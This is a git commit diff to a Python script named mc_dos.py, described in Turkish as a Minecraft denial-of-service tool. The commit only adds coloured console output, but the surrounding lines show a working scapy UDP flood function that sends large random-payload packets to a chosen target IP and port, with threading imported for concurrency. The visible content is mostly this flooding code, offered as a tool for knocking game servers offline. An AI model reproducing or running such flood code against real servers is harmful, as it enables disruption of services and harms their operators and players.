74fd6f2c5fbe45717316b4397b132cac3676a0c9
Aslak35-me <aslak35@proton.me>
2025-03-03 22:42:58 +0300

    Update mc_dos.py

--- mc_dos.py
+++ mc_dos.py
@@ -2,12 +2,15 @@ import argparse
 import random
 import threading
 from scapy.all import *
+from colorama import init, Fore
+
+init(autoreset=True)
 
 def udp_flood(target_ip, target_port, packet_count):
     for i in range(packet_count):
         packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=random._urandom(1024))
         send(packet, verbose=False)
-        print(f"[+] Paket gönderildi {i+1}/{packet_count}")
+        print(Fore.GREEN + f"[+] Paket gönderildi {i+1}/{packet_count}")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Minecraft DOS Aracı")
